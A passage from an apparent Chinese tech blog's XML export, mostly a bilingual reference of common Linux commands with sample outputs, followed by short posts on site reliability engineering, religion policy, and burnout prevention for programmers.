the owner of a file test.txt to root, as well as set its group as root, execute the following command:1chown root:root test.txt Cksum分类：文件管理；查看文件属性The cksum command prints the CRC checksum and byte count for the input file.123$ cksum test.txt3741370333 20 test.txtNot sure what checksum is? Head here. Clear分类：人机交互；清屏The clear command is used to clear the terminal screen.1$ clear Cmp分类：文件管理；文件比对 byte-by-byteThe cmp command is used to perform byte-by-byte comparison of two files.12$ cmp file1 file2file1 file2 differ: byte 1, line 1 Comm分类：文件管理；文件比对The comm command is used to compare two sorted files line-by-line. For example, if ‘file1’ contains numbers 1-5 and ‘file2’ contains number 4-8, here’s what the ‘comm’ command produces in this case:1$ comm file1 file2 支持选项：123-1：不显示在第一个文件出现的内容；-2：不显示在第二个文件中出现的内容；-3：不显示同时在两个文件中都出现的内容。 Cp分类：文件管理；文件复制The cp command is used for copying files and directories.1$ cp test.txt /home//himanshu/Desktop/ Csplit分类：文件管理；待补充内容The csplit command lets you split a file into sections determined by context lines. For example, to split a file into two where the first part contains ‘n-1’ lines and the second contains the rest, use the following command: 1$ csplit file1 [n] The two parts are saved as files with names ‘xx00’ and ‘xx01’, respectively. Date分类：系统信息；查看系统时间The date command can be used to print (or even set) the system date and time.12$ dateTue Feb 28 17:14:57 IST 2017 Dd分类：文件管理；待补充内容The dd command copies a file, converting and formatting according to the operands. For example, the following command creates an image of /dev/sda partition.1dd if=/dev/sda of=/tmp/dev-sda-part.img Df分类：文件管理；查看文件系统利用率The df command displays the file system disk space usage in output.123$ df /dev/sda1Filesystem 1K-blocks Used Available Use% Mounted on/dev/sda1 74985616 48138832 23014620 68% / Diff分类：文件管理；文件比对 line-by-lineThe diff command lets you compare two files line by line.1$ diff file1 file2 Diff3分类：文件管理；文件比对,三个文件The diff3 command, as the name suggests, allows you to compare three files line by line.1diff3 file1 file2 file3 Dir分类：文件管理；查看当前目录文件列表The dir command lists directory contents. For example:12$ dirtest1 test2 test.7z test.zip Dirname分类：文件管理；查看当前目录The dirname command strips last component from a file name/path. In layman’s terms, you can think of it as a tool that, for example, removes file name from the file’s absolute path.12$ dirname /home/himanshu/file1/home/himanshu Dmidecode分类：系统信息；查看硬件信息 The dmidecode command prints a system’s DMI (aka SMBIOS) table contents in a human-readable format.12345678910111213$ sudo dmidecode# dmidecode 2.12SMBIOS 2.6 present.50 structures occupying 2056 bytes.Table at 0x000FCCA0.Handle 0x0000, DMI type 0, 24 bytesBIOS InformationVendor: American Megatrends Inc.Version: 080015Release Date: 08/22/2011......... DMI (Desktop Management Interface, DMI)就是帮助收集电脑系统信息的管理系统，DMI信息的收集必须在严格遵照SMBIOS规范的前提下进行。 SMBIOS(System Management BIOS)是主板或系统制造者以标准格式显示产品管理信息所需遵循的统一规范。SMBIOS和DMI是由行业指导机构Desktop Management Task Force (DMTF)起草的开放性的技术标准，其中DMI设计适用于任何的平台和操作系统。 Du分类：文件管理；查看指定目录磁盘利用率The du command displays disk usage of files present in a directory as well as its sub-directories.123456789$ du /home/himanshu/Desktop/92 /home/himanshu/Desktop/Downloads/meld/meld/ui88 /home/himanshu/Desktop/Downloads/meld/meld/vc56 /home/himanshu/Desktop/Downloads/meld/meld/matchers12 /home/himanshu/Desktop/Downloads/meld/meld/__pycache__688 /home/himanshu/Desktop/Downloads/meld/meld16 /home/himanshu/Desktop/Downloads/meld/bin328 /home/himanshu/Desktop/Downloads/meld/data/ui52 /home/himanshu/Desktop/Downloads/meld/data/icons/svg EchoThe echo command displays whatever input text is given to it.12$ echo hello hihello hi Ed分类：文件管理；编辑器ed is a line-oriented text editor.1$ ed 单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工作模式。支持选项：1234567A：切换到输入模式，在文件的最后一行之后输入新的内容；C：切换到输入模式，用输入的内容替换掉最后一行的内容；i：切换到输入模式，在当前行之前加入一个新的空行来输入内容；d：用于删除最后一行文本内容；n：用于显示最后一行的行号和内容；w：&lt;文件名&gt;：一给定的文件名保存当前正在编辑的文件；q：退出ed编辑器。 Eject分类：媒体管理；卸载The eject command lets you eject removable media (typically, a CD ROM or floppy disk)1$ eject Env分类：系统信息；查看用户环境变量The env command not only displays the current environment, but also lets you edit it.1$ env Exit分类：交互；退出The exit command causes the shell to exit.1$ exit Expand分类：文件管理；编辑器；将TAB符替换为空格符The expand command converts tabs present in the input file(s) into spaces, and writes the file contents to standard output.1$ expand file1 Expr分类：计算器；表达式The expr command evaluates expressions. For example:12$ expr 1 + 23 Factor分类：计算器；分解质因数The factor command prints the prime factors of the input number.12$ factor 135135: 3 3 3 5 Fgrep分类：文件管理；搜索；匹配指定文件字符 The fgrep command is equivalent to the grep command when executed with the -F command line option. The tool is also known as fixed or fast grep as it doesn’t treat regular expression metacharacters as special, processing the information as simple string instead. For example, if you want to search for dot (.) in a file, and don’t want grep to interpret it as a wildcard character, use fgrep in the following way:1$ fgrep &quot;.&quot; [file-name] Find分类：文件管理；搜索；The find command lets you search for files in a directory as well as its sub-directories.123456789101112$ find test*testtest1test2test.7ztest.ctest.txtMore examples for the Linux Find command:* 14 Practical Examples of Linux Find Command for Beginners* Searching For Files And Folders With The find Command* Finding Files On The Command Line Fmt分类：文件管理；读取文件内容并格式化输出（查看支持选项）fmt is a simple optimal text formatter. It reformats each paragraph in the file passed to it, and writes the file contents to standard output.1$ fmt file1 Fold分类：交互；控制文件内容输出时所占用的屏幕宽度 The fold command wraps each input line to fit in specified width.12345$ fold -w 10Hi my name is himanshu AroraHi my nameis himanshu Arora Free分类：系统信息；性能监测；查看内存利用情况。详细介绍 &gt;&gt;&gt;more&gt;&gt;&gt;The free command displays the amount of free and used memory in the system.12345$ free total used free shared buffers cachedMem: 1800032 1355288 444744 79440 9068 216236-/+ buffers/cache: 1129984 670048Swap: 1832956 995076 837880 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单(Netflix版) 操作系统原理 | How Linux Works（三）：Memory Grep分类：文件管理；搜索；The grep command searches for a specified pattern in a file (or files) and displays in output lines containing that pattern.12345678$ grep Hello test.txtHello...how are you?More tutorials and examples for the Linux Grep command:* How to use grep to search for strings in files on the shell* How to perform pattern search in files using Grep$ grep -r test /usr Groups分类：文件管理；搜索；The groups command displays the name of groups a user is part of.12$ groups himanshuhimanshu : himanshu adm cdrom sudo dip plugdev lpadmin sambashare Gzip分类：文件管理；压缩The gzip command compresses the input file, replacing the file itself with one having a .gz extension.1$ gzip file1 Gunzip分类：文件管理；解压缩Files compressed with gzip command can be restored to their original form using the gunzip command.1$ gunzip file1.gz Head分类：文件管理；查看文件The head command displays the first 10 lines of the file to standard output1234567891011$ head CHANGELOG.txtBEEBEEP (Secure Lan Messanger)BeeBEEP2.0.4- Some GUI improvements (new icons, file sharing tree load faster)- Always Beep on new message arrived (option)- Favorite users (right click on user and enable star button) is on top of the list- improved group usability- Offline users can be removed from list (right click on an offline user in list and then remove)- Clear all files shared (option)- Load minimized at startup (option) Hostname分类：系统信息；host nameThe hostname command not only displays the system’s host name, but lets them set it as well.12$ hostnamehimanshu-desktop Id分类：系统信息；用户信息The id command prints user and group information for the current user or specified username.12$ id himanshuuid=1000(himanshu) gid=1000(himanshu) groups=1000(himanshu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare) Kill分类：进程管理；The kill command, as the name suggests, helps user kill a process by sending the TERM signal to it.1$ kill [process-id] Killall分类：进程管理；The killall command lets you kill a process by name. Unlike kill - which requires ID of the process to be killed - killall just requires the name of the process.1$ killall nautilus Last分类：安全管理；查看最近登录用户The last command shows listing of last logged in users.1234567$ lasthimanshu pts/11 :0 Thu Mar 2 09:46 still logged inhimanshu pts/1 :0 Thu Mar 2 09:46 still logged inhimanshu :0 :0 Thu Mar 2 09:42 still logged inreboot system boot 4.4.0-62-generic Thu Mar 2 09:41 - 10:36 (00:54)himanshu pts/14 :0 Wed Mar 1 15:17 - 15:52 (00:35)himanshu pts/13 :0 Wed Mar 1 14:40 - down (08:06) Ldd分类：软件包管理；查看一个共享库的依赖The ldd command displays in output dependencies of a shared library.1234$ ldd /lib/i386-linux-gnu/libcrypt-2.19.solinux-gate.so.1 =&gt; (0xb77df000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75da000)/lib/ld-linux.so.2 (0x80088000) Ln分类：文件管理；链接The ln command is used for creating link between files. For example, the following command would create a link named ‘lnk’ to a file with name ‘test.txt’:1$ ln test.txt lnk Locate分类：文件管理；搜索The locate command helps user find a file by name.1$ locate [file-name] Logname分类：登录信息；The logname command prints the user-name of the current user.12$ lognamehimanshu Ls分类：文件管理；查看文件列表The ls command lists contents of a directory in output.1234$ ls progresscapture.png hlist.o progress progress.h sizes.chlist.c LICENSE progress.1 progress.o sizes.hhlist.h Makefile progress.c README.md sizes.o Lshw分类：系统信息；查看硬件信息The lshw command extracts and displays detailed information on the hardware configuration of the machine.12345678910111213$ sudo lshw[sudo] password for himanshu:himanshu-desktopdescription: Desktop Computerproduct: To Be Filled By O.E.M. (To Be Filled By O.E.M.)vendor: To Be Filled By O.E.M.version: To Be Filled By O.E.M.serial: To Be Filled By O.E.M.width: 32 bitscapabilities: smbios-2.6 dmi-2.6 smp-1.4 smp........ Lscpu分类：系统信息；查看硬件信息-CPU The lscpu command displays in output system’s CPU architecture information (such as number of CPUs, threads, cores, sockets, and more).12345678910111213141516171819$ lscpuArchitecture: i686CPU op-mode(s): 32-bit, 64-bitByte Order: Little EndianCPU(s): 1On-line CPU(s) list: 0Thread(s) per core: 1Core(s) per socket: 1Socket(s): 1Vendor ID: AuthenticAMDCPU family: 16Model: 6Stepping: 3CPU MHz: 2800.234BogoMIPS: 5600.46Virtualization: AMD-VL1d cache: 64KL1i cache: 64KL2 cache: 1024K Man分类：帮助；man lets you access reference manual for commands, programs/utilities, as well as functions.1$ man ls Md5sum分类：计算器；md5The md5sum command lets you print or check MD5 (128-bit) checksums.12$ md5sum test.txtac34b1f34803a6691ff8b732bb97fbba test.txt Mkdir分类：文件管理；创建目录The mkdir command lets you create directories.1$ mkdir [dir-name] Mkfifo分类：进程管理The mkfifo command is used to create named pipes.1$ mkfifo [pipe-name] More分类：交互more is basically a filter for paging through text one screenful at a time.1$ cat [large-file] | more Mv分类：文件管理；移动The mv command lets you either move a file from one directory to another, or rename it.1$ mv test.txt /home/himanshu/Desktop/ Nice分类：进程管理；指定进程优先级The nice command lets you run a program with modified scheduling priority.123$ nice -n[niceness-value] [program]$ nice -n15 vim Nl分类：文件管理；输出行号The nl command writes contents of a file to output, and prepends each line with line number.1234$ nl file11 Hi2 How are you3 Bye Nm分类：文件管理The nm command is used to display symbols from object files. 12345678910111213141516171819$ nm test0804a020 B __bss_start0804841d T compare0804a020 b completed.65910804a018 D __data_start0804a018 W data_start08048360 t deregister_tm_clones080483d0 t __do_global_dtors_aux08049f0c t __do_global_dtors_aux_fini_array_entry0804a01c D __dso_handle08049f14 d _DYNAMIC0804a020 D _edata0804a024 B _end080484e4 T _fini080484f8 R _fp_hw080483f0 t frame_dummy......... Nproc分类：进程管理The nproc command displays the number of processing units available to the current process.12$ nproc1 Od分类：文件管理The od command lets you dump files in octal as well as some other formats.12345678910$ od /bin/ls0000000 042577 043114 000401 000001 000000 000000 000000 0000000000020 000002 000003 000001 000000 140101 004004 000064 0000000000040 122104 000001 000000 000000 000064 000040 000011 0000500000060 000034 000033 000006 000000 000064 000000 100064 0040040000100 100064 004004 000440 000000 000440 000000 000005 0000000000120 000004 000000 000003 000000 000524 000000 100524 004004......... Passwd分类：用户权限管理The passwd command is used for changing passwords for user accounts.123$ passwd himanshuChanging password for himanshu.(current) UNIX password: Paste分类：交互The paste command lets you merge lines of files. For example, if ‘file1’ contains the following lines:123456789101112131415$ cat file1HiMy name isHimanshuAroraIAmaLinux researcherand tutorialwriterThen the following &apos;paste&apos; command will join all the lines of the file:$ paste -s file1Hi My name is Himanshu Arora I Am a Linux researcher and tutorial writer Pidof分类：进程管理The pidof command gives you the process ID of a running program/process.12$ pidof nautilus2714 Ping分类：网络管理The ping command is used to check whether or not a system is up and responding. It sends ICMP ECHO_REQUEST to network hosts.12345$ ping howtoforge.comPING howtoforge.com (104.24.0.68) 56(84) bytes of data.64 bytes from 104.24.0.68: icmp_seq=1 ttl=58 time=47.3 ms64 bytes from 104.24.0.68: icmp_seq=2 ttl=58 time=51.9 ms64 bytes from 104.24.0.68: icmp_seq=3 ttl=58 time=57.4 ms Ps分类：进程管理The ps command displays information (in the form of a snapshot) about the currently active processes.1234$ psPID TTY TIME CMD4537 pts/1 00:00:00 bash20592 pts/1 00:00:00 ps Pstree分类：进程管理The pstree command produces information about running processes in the form of a tree.12345678$ pstreeinit???ModemManager???2*[&#123;ModemManager&#125;]??NetworkManager???dhclient? ??dnsmasq? ??3*[&#123;NetworkManager&#125;]??accounts-daemon???2*[&#123;accounts-daemon&#125;]??acpid??atop PwdThe pwd command displays the name of current/working directory.12$ pwd/home/himanshu Rm分类：文件管理The rm command lets you remove files and/or directories.1$ rm [file-name] Rmdir分类：文件管理The rmdir command allows you delete empty directories.1$ rmdir [dir-name] Scp分类：文件管理The scp command lets you securely copy files between systems on a network.1$ scp [name-and-path-of-file-to-transfer] [user]@[host]:[dest-path] Sdiff分类：文件管理；文本比对 side-by-sideThe sdiff command lets you perform a side-by-side merge of differences between two files.1$ sdiff file1 file2 Sed分类：文件管理;编程工具sed is basically a stream editor that allows users to perform basic text transformations on an input stream (a file or input from a pipeline).12$ echo &quot;Welcome to Howtoforge&quot; | sed -e &apos;s/Howtoforge/HowtoForge/g&apos;Welcome to HowtoForge Seq分类：计算器The seq commands prints numbers from FIRST to LAST, in steps of INCREMENT. For example, if FIRST is 1, LAST is 10, and INCREMENT is 2, then here’s the output this command produces: 123456$ seq 1 2 1013579 Sha1sum分类：计算器The sha1sum command is used to print or check SHA1 (160-bit) checksums.12$ sha1sum test.txt955e48dfc9256866b3e5138fcea5ea0406105e68 test.txt ShutdownThe shutdown command lets user shut the system in a safe way.1$ shutdown Size分类：文件管理The size command lists the section sizes as well as the total size for an object or archive file.123$ size testtext data bss dec hex filename1204 280 4 1488 5d0 test SleepThe sleep command lets user specify delay for a specified amount of time. You can use it to delay an operation like:1$ sleep 10; shutdown Sort分类：文件管理The sort command lets you sort lines of text files. For example, if ‘file2’ contains the following names:123456789101112$ cat file2zeuskyansamadamThen running the sort command produces the following output:$ sort file2adamkyansamzeus Split分类：文件管理The split command, as the name suggests, splits a file into fixed-size pieces. By default, files with name like xaa, xab, and xac are produced. $ split [file-name] Sshssh is basically OpenSSH SSH client. It provides secure encrypted communication between two untrusted hosts over an insecure network.1$ ssh [user-name]@[remote-server] Stat分类：文件管理The stat command displays status related to a file or a file-system.123456789$ stat test.txtFile: ‘test.txt’Size: 20 Blocks: 8 IO Block: 4096 regular fileDevice: 801h/2049d Inode: 284762 Links: 2Access: (0664/-rw-rw-r--) Uid: ( 0/ root) Gid: ( 0/ root)Access: 2017-03-03 12:41:27.791206947 +0530Modify: 2017-02-28 16:05:15.952472926 +0530Change: 2017-03-02 11:10:00.028548636 +0530Birth: - Strings分类：文件管理The strings command displays in output printable character sequences that are at least 4 characters long. For example, when a binary executable ‘test’ was passed as an argument to this command, following output was produced:1234567891011121314151617$ strings test/lib/ld-linux.so.2libc.so.6_IO_stdin_usedputs__libc_start_main__gmon_start__GLIBC_2.0PTRhQVhI[^_]EQUAL;*2$&quot;GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4............ Su分类：用户权限管理The su command lets you change user-identity. Mostly, this command is used to become root or superuser.1$ su [user-name] Sudo分类：用户权限管理The sudo command lets a permitted user run a command as another user (usually root or superuser).1$ sudo [command] Sum分类：文件管理The sum command prints checksum and block counts for each input file.12$ sum readme.txt45252 5 Tac分类：文件管理The tac command prints input files in reverse. Functionality-wise, it does the reverse of what the cat command does.12345678910$ cat file2zeuskyansamadam$ tac file2adamsamkyanzeus Tail分类：文件管理The tail command displays in output the last 10 lines of a file.1$ tail [file-name] Talk分类：网络管理The talk command lets users talk with each other.1$ talk [user-name] Tar分类：文件管理；压缩&amp;解压缩tar is an archiving utility that lets you create as well as extract archive files. For example, to create archive.tar from files ‘foo’ and ‘bar’, use the following command:123$ tar -cf archive.tar foo barMore... Tee分类：文件管理The tee command reads from standard input and write to standard output as well as files.1234$ uname | tee file2Linux$ cat file2Linux Test分类：计算器The test command checks file types and compare values. For example, you can use it in the following way:12$ test 7 -gt 5 &amp;&amp; echo &quot;true&quot;true Time分类：性能监测The time command is used to summarize system resource usage of a program. For example:12345678910$ time ping google.comPING google.com (216.58.220.206) 56(84) bytes of data.64 bytes from del01s08-in-f14.1e100.net (216.58.220.206): icmp_seq=1 ttl=52 time=44.2 ms^C--- google.com ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 44.288/44.288/44.288/0.000 msreal 0m0.676suser 0m0.000ssys 0m0.000s Top分类：系统信息；性能监测；性能概览。详细介绍 &gt;&gt;&gt;more&gt;&gt;&gt;The top command gives a dynamic real-time view of a running system (in terms of its processes). For example:1$ top Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单(Netflix版) 操作系统原理 | How Linux Works（三）：Memory Touch分类：文件管理The touch command lets you change file timestamps (the access and modification times). When name of a non-existent file is passed as an argument, that file gets created.1$ touch [file-name] Tr分类：文件管理The tr command can be used to translate/squeeze/delete characters. For example, here’s how you can use it to convert lowercase characters to uppercase:12$ echo &apos;howtoforge&apos; | tr &quot;[:lower:]&quot; &quot;[:upper:]&quot;HOWTOFORGE Tty分类：资源管理The tty command prints the filename of the terminal connected to standard input.12$ tty/dev/pts/10 Uname分类：用户权限管理The uname command prints certain system information.12$ uname -aLinux himanshu-desktop 4.4.0-62-generic #83~14.04.1-Ubuntu SMP Wed Jan 18 18:10:26 UTC 2017 i686 athlon i686 GNU/Linux Uniq分类：文件管理；待补充信息The Uniq command is used to report or omit repeated lines. For example, if ‘file2’ contains the following data:1234567891011$ cat file2Welcome to HowtoForgeWelcome to HowtoForgeA Linux tutorial websiteThanksThen you can use the uniq command to omit the repeated line.$ uniq file2Welcome to HowtoForgeA Linux tutorial websiteThanks Unexpand分类：文件管理；待补充信息The unexpand command converts spaces present in the input file(s) into tabs, and writes the file contents to standard output.1$ unexpand file1 Uptime分类：系统信息；性能监测；查看负载。详细介绍 &gt;&gt;&gt;more&gt;&gt;&gt;The uptime command tells how long the system has been running.12$ uptime15:59:59 up 6:20, 4 users, load average: 0.81, 0.92, 0.82 Users分类：用户权限管理；待补充信息The users command displays in output the usernames of users currently logged in to the current host.12$ usershimanshu himanshu himanshu himanshu Vdir分类：文件管理；待补充信息The vdir command lists information about contents of a directory (current directory by default).12345$ vdirtotal 1088-rw-rw-r-- 1 himanshu himanshu 4850 May 20 2015 test_backup.pdf-rw-rw-r-- 1 himanshu himanshu 2082 May 28 2015 test-filled.pdf-rw-rw-r-- 1 himanshu himanshu 7101 May 28 2015 test.pdf Vim分类：编辑器vim is basically a text/programming editor. The name ‘vim’ stands for Vi IMproved as the editor is upwards compatible to the Vi editor.1$ vim [file-name] W分类：性能监测The w command displays information about the users currently on the machine, and their processes.1234567$ w16:18:07 up 6:39, 4 users, load average: 0.07, 0.32, 0.53USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAThimanshu :0 :0 09:39 ?xdm? 1:08m 0.25s init --userhimanshu pts/0 :0 09:41 6:36m 0.84s 7.84s gnome-terminalhimanshu pts/10 :0 14:51 0.00s 0.16s 0.00s whimanshu pts/11 :0 15:41 35:19 0.05s 0.05s bash Wall分类：通讯；待补充信息The wall command lets you write and send a message to other users that are currently logged in.1$ wall [your-message] Watch分类：性能监测The watch command can be used to monitor a program’s output. It runs the program repeatedly, displaying its output and errors. For example:1$ watch date Wc分类：文件管理；待补充信息The wc command prints newline, word, and byte counts for a file.12$ wc test.txt0 3 20 test.txt Whatis分类：帮助The whatis command displays single-line manual page descriptions.1234$ whatis mkdirmkdir (1) - make directoriesmkdir (2) - create a directorymkdir (1posix) - make directories Which分类：文件管理；以来The which command basically lets you locate a command - the file and the path of the file that gets executed. For example:12$ which date/bin/date Who分类：登录信息The who command shows who is logged on.12345$ whohimanshu :0 2017-03-03 09:39 (:0)himanshu pts/0 2017-03-03 09:41 (:0)himanshu pts/10 2017-03-03 14:51 (:0)himanshu pts/11 2017-03-03 15:41 (:0) Whereis分类：文件管理；以来The whereis command shows in output locations of the binary, source, and manual page files for a command.12$ whereis lsls: /bin/ls /usr/share/man/man1/ls.1posix.gz /usr/share/man/man1/ls.1.gz Whoami分类：登录信息The whoami command prints effective userid of the current user.12$ whoamihimanshu Xargs分类：编程工具The xargs command builds and executes command lines from standard input. In layman’s terms, it reads items from stdin and executes a command passed to it as an argument. For example, here’s how you can use xargs to find the word “Linux” in the files whose names are passed to it as input.12345678$ xargs grep &quot;Linux&quot;file1file2file3file1:Linux researcherfile2:A Linux tutorial websitefile3:Linux is opensourceMore... Yes分类：交互；确认The Yes command outputs a string repeatedly until killed.1$ yes [string] 扩展阅读：Linux 操作系统 《Linus Torvalds:Just for Fun》 Linux 常用命令一百条 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单(Netflix版) Linux 性能诊断：荐书|《图解性能优化》 Linux 性能诊断：Web应用性能优化 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 推荐：电子书《Linux Perf Master》发表在GitBook平台，欢迎订阅、下载、批评指正: https://www.gitbook.com/book/riboseyim/linux-perf-master/details]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SRE:Site Reliability Engineering]]></title>
    <url>%2F2017%2F04%2F26%2FSRE%2F</url>
    <content type="text"><![CDATA[摘要 SRE Workflow Code define Config 拜占庭将军问题 Workflow SREcon: Performance Checklists for SREs 2016 | Brendan Gregg’s Blog OS 造成的长时间非典型 JVM GC 停顿：深度分析和解决|庄振运 Discuss NASA:可以告知故障的机器COMSoL综合系统健康管理（Integrated System Health Management）软件的第一个版本于2003年在NASA艾姆斯研究中心（Ames Research Center）被开发出来，以此来监视一个试验型固液混合火箭发动机试车台。 腾讯数据中心:三大谷歌欧洲数据中心究竟如何做到100%自然冷却 ApplicationCode define Config SRE Team of Stack Overflow: DNSControl 分类：网络协议 Monitor beyond website monitoring the value of access logs Chris Jones:分布式共识系统Minghua Ye：App EngineMinghua Yescalable system automated service discovery google protocol buffer 消息协议，向后兼容 core lib c++ command-line flags Logging Googletest diff log diff filepages:blogs: 分布式共识系统CAP：无人值守的一致的高可用系统是不存在的CA系统：分区难题 脑裂 如何判断主从CP系统＋A：接受分区，在分区的情况下保持一致，牺牲一定损失 Zookeeper 拜占庭将军问题稳定状态需要 3N＋1（拜占庭式失败）或2N＋1（非拜占庭式失败）个实例。即多进程达到一致 单点故障源复制状态机（RSM），很久不动的冷备没有意义，风险更高。应用：分布式cron系统无状态微服务系统，先要有一个保障一致性（存储状态）的可靠服务。 扩展阅读：DevOps 漫谈系列 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 InfoQ:SRE是什么鬼 / 来自 Google DevOps 经验的落地实践]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[政府行为模型及预测：宗教(Religion)]]></title>
    <url>%2F2017%2F04%2F21%2FPolicy-Religion%2F</url>
    <content type="text"><![CDATA[摘要 翻译 鸠摩罗什译出《摩诃般若波罗蜜多心经》、《妙法莲华经》、《维摩诘经》、《佛说阿弥陀经》、《金刚经》等经和《中论》、《百论》、《十二门论》和《大智度论》等论，共七十四部，三百八十四卷。 译文非常简洁晓畅，中国之佛教由鸠摩罗什而面目一新。 扩展阅读 《The Souls of China:The Return of Religion after Mao.》By lan Johnson.Pantheon;455 pages;$30. Allen Lane 参考文献 中国当前宗教工作中的 新情况新问题 | 20101210,瞭望中国]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IT 工程师养生指南]]></title>
    <url>%2F2017%2F04%2F21%2FHealth%2F</url>
    <content type="text"><![CDATA[摘要 《养生指南》 《嗑药简史》 This article is part of an Work Life Balance tutorial series. Make sure to check out my other articles as well: IT 工程师养生指南 医学常识| NIH 情绪健康检查单 为什么会产生倦怠？ “burnout is caused when you repeatedly make large amounts of sacrifice and or effort into high-risk problems that fail. ” 相比其他领域的专业人士，程序员似乎更经常出现倦怠（Burnout ）。目前没有明确的证据能够描述这种情况, 大致有以下四个主要原因： 第一，物理的（physical）。程序员每天坐在办公桌前的工作方式是不健康的, 它会让你感到更加昏昏欲睡。嗜睡也可能导致其他不那么好的习惯, 如白天吃零食, 沉迷兴奋剂, 熬夜等，导致身体损伤。第二，编程工作是认知高度集中和紧张的工作, 心理疲劳也可能会造成精神损伤。第三，也可能是因为你正在做的工作, 事实上,耗费心力而且吃力不讨好。解决这一问题的唯一办法就是在不考虑金钱为因素的情况下, 花点时间对你想从事的工作做一些反省。第四，当你作出大量牺牲,或努力解决高风险的问题, 但是反复失败时就会造成倦怠。在编程过程中往往伴随着运行失败，你的大脑容易将工作和失败联系在一起。 在工作中如何维持积极性，保持长久的生产力？下面介绍一些可行的技巧, 加以练习养成习惯后能够有效地延缓甚至消除倦怠。 基本套餐 It’s a simple but effective strategy for staying productive as a programmer while at the same getting some necessary break between the tasks. 吃好。 从小的方面开始, 比如喝苏打水;将低碳水化合物和蔬菜纳入饮食；少量多餐, 不要暴饮暴食。 睡好。 包括获得足够良好的睡眠。你有许多事情可以做, 例如创造一个更好的睡眠环境。一个秘诀是减少蓝光照射 — 可能会让你晚上熬夜。推荐软件：Flux 能随着一天的时间变化自动调整你电脑显示器屏幕的色温，过滤对人眼伤害最大的蓝光，从而尽可能减少屏幕对眼睛所带来的疲劳感并帮助提高睡眠质量。相应地，白天要多晒太阳。诱发睡眠的最重要的因素之一是你的身体自然分泌一种叫做褪黑素（Melatonin）的荷尔蒙。褪黑素是由你大脑中的松果体（pineal gland，位于脊椎动物脑中的小内分泌腺体，人体最小的器官）产生的, 它发出信号来调节身体中的睡眠-唤醒周期。阳光提供了天然的光谱, 我们需要配合褪黑素的生产周期。白天多点光线, 晚上少点光线, 一个神奇的睡眠公式。 不要过度劳累。 许多研究成果一再发现, 在这种情况下, 生产率(此处特指产出)在 4 个小时的专注工作之后就开始急剧下降。需要高度集中注意力的工作, 例如如长期的编程, 每天持续工作很长时间是不可能的。 番茄工作法（Pomodoro Technique，一种时间管理法方法，该方法使用一个定时器来分割出一个一般为25分钟的工作时间和5分钟的休息时间，而那些时间段被称为 pomodori，为意大利语单词 pomodoro “番茄” 的复数）。理想情况下, 休息时远离计算机，进行轻快的散步,做一些俯卧撑等。 Stay active, keep moving. 很多人对运动（exercise）有一种误解,认为锻炼必须包括去健身房等等。在现实中有很多保持活跃的方法，例如选择楼梯而不是电梯; 把车停在购物中心的街角停车点; 骑车去工作, 找到其他的方法将运动融入到你的日常生活中会让你感觉更好, 而不是整天卡在电脑前。 程序员增强套餐 戚继光：有精器而无精兵以用之，是谓徒费；有精兵而无精器以助之，是谓徒强。 尝试, 游戏, 学习, 实验原型（Experiment, play, learn, prototype）。 短期来看，只做你最擅长的事是高效和有利可图的。例如, 继续以重复的方式创建网站,。然而, 随着时间的推移, 它会变得无聊以及耗费精神。从工程的角度看，编程是使用行之有效的技术来生产软件的一个环节。同时它也关于乐趣, 实验和尝试新的想法。你可以特意将 20% 的时间用来游手好闲 — 这是避免倦怠的最有效的策略之一。游手好闲包括尝试新的类库, 创建一些有趣而不纯粹为了完成工作任务的东西, 或者从你的舒适区走出来、投资时间学习的东西, 例如函数式编程。 参加聚会、会议、订阅行业资讯。 编程会变得孤独。与其他开发者见面, 或者倾听他们在播客上的经验, 使你不仅仅只关注眼前的状况, 而是更关心你的工作。没有人喜欢抱怨, 但分享或倾听，与其他程序员交流, 例如倾听别人是如何克服困难的有助于舒缓情绪, 激励信心。 创造一个良好的工作环境并且不要吝啬投资你的工具(Invest in a good working environment and don’t be cheap on your tools ) 。 一台高配置的 PC 将编译得更快而不是让你将时间浪费在等待。请确保您有一个舒适的椅子, 桌子和良好设置的显示器。如果你在一个嘈杂的环境中工作, 可以投资高质量的耳机隔绝噪音使你保持安静。 Master your tools. 虽然有好的工具可以使编程过程更愉快, 熟练地掌握它们提高工作效率更加令人欣慰。了解工具的所有快捷方式, 即编辑器、OS、命令行, 每天都可以节省大量时间。如果能够将日常任务自动化，则可以让你更快地取得进步, 更进一步消除工作倦怠。 休息，保持对其它事物的激情。 除了编程之外, 还有许多有趣的活动。例如: 体育、文化活动、性、阅读、乐高、社交、钓鱼、烘焙咖啡、摄影等。如果你一直只做一件事, 比如编程, 总有一天你会不可避免地醒来 — 因为没有生命而憎恨自己。此外, 做一些看似与你的 “实际” 工作无关的事情, 可能会重新点燃你的激情, 激发新的想法, 就像理查德·费曼（著名物理学家，诺贝尔奖得主）在研究板块活动时一样。 考虑切换工作内容或启动不同的项目。 如果你当前被困在做无趣的、耗费精神工作上, 比如整天调整现有的代码库。或者你所从事的项目可能与你的兴趣或价值观不符。此外, 如果你发现编码不再能引起你的兴趣, 不妨看看其它相关的领域, 如信息系统架构（Information Architecture）, 系统管理（Systems Administration）等,可能会重新激发你的激情。 完成例行任务, 将那些你知道可以完成的内容纳入每日工作。诸如完成代码测试、写注释、改进变量命名等, 